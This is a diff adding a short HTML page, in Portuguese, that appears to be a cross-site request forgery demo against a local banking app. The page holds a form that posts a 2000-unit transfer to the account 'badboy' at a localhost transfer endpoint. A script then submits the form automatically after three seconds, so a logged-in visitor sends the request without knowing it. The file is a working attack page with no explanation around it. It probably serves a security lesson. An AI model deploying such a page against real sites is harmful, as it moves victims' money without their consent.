@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Banco Pagina de CSRF iframe </title>
+</head>
+<body>
+  <h1>Transferência automática após 3 segundos</h1>
+  <form id="form" action="http://localhost:3000/api/transfer_money"  method="post">
+    <input name="username" value="badboy"/>
+    <input name="money" value="2000"/>
+  </form>
+  <script>
+  </script>
+  <script src="/js/jquery.js"></script>
+  <script>
+    //Enviar o formulario depois de 3 segundo
+    setTimeout(function() {
+      $('#form').submit();
+    }, 3000);
+  </script>
+</body>
+</html>
